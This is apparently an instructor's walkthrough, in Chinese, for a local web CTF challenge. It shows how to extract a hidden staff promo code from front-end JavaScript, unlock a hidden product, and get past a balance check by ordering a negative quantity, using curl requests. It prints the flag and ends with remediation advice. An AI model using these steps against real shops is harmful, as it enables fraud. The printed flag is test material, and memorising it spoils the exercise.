# Web 讲师解题步骤

## 环境

```bash
cd web
./start.sh 8080          # 或 ./start.sh 0 使用随机端口
python3 solve.py --url http://127.0.0.1:8080
./stop.sh
```

服务端代码在 `instructor/server.py`，flag 在 `instructor/flag.txt`。`public/` 中不含 flag。

## 步骤 1：从前端拿到员工促销码

访问 `/static/app.js`，可以看到：

```js
// TODO(ops): remove the legacy staff referral seed before the public launch.
const STAFF_PROMO = "U1RBRkYtMjAyNA==";
```

Base64 解码：

```bash
printf 'U1RBRkYtMjAyNA==' | base64 -d
# STAFF-2024
```

用任意名字调用登录接口，拿到 token：

```bash
curl -s -X POST http://127.0.0.1:8080/api/login \
  -H 'Content-Type: application/json' \
  -d '{"name":"student"}'
```

响应中的 `token` 用于后续 `Authorization: Bearer <token>`。

## 步骤 2：兑换促销码，解锁隐藏商品

```bash
curl -s -X POST http://127.0.0.1:8080/api/redeem \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <TOKEN>' \
  -d '{"code":"STAFF-2024"}'
```

之后 `GET /api/products` 会多出：

```json
{"id": 99, "name": "Flag License", "price": 99900, "kind": "vip"}
```

## 步骤 3：负数数量绕过余额检查

服务端逻辑：

```python
total = product["price"] * qty
if total > user["balance"]:
    reject()
user["balance"] -= total
if product_id == 99:
    return flag
```

`qty = -1` 时：

```text
total = 99900 * (-1) = -99900
-99900 > 5000 为假  -> 通过检查
```

请求：

```bash
curl -s -X POST http://127.0.0.1:8080/api/order \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <TOKEN>' \
  -d '{"product_id":99,"qty":-1}'
```

响应中的 `flag` 字段即答案：

```text
flag{w3b_l0gic_1s_st1ll_l0gic}
```

## 修复建议（讲师可讲）

- 校验 `qty` 必须为正整数，并设置合理上限。
- 使用整数分或 `Decimal`，在服务端重新计算价格。
- 不要依赖前端隐藏/混淆作为权限边界；VIP 商品应在服务端做授权。
- 促销码、内部备注不应出现在生产前端包中。

## 自动化验证

根目录 `python3 verify_all.py` 会启动随机端口、运行 `solve.py`、比对 `instructor/flag.txt` 后关闭服务。
